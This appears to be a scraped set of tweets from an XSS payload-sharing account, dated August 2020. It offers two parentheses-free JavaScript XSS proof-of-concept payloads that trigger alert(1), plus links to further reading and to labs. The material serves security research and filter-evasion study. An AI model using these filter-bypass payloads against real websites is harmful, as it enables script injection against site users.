##User: XssPayloads	Time: 20200807
> 
``` And that one on FF by @garethheyes 
{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'

More reading about parentheses and semi-columns free payloads: https://bit.ly/2XAhFmF ```
  
  > 
``` Impossible (XSS) labs by @PortSwiggerRes
 https://bit.ly/3ipvj47 
Good luck...```
  
  > 
``` Another parentheses free payload by @aemkei 
<script>
onload=setTimeout
Event.prototype.toString=
_=>"alert\501\51"
</script>```
  
  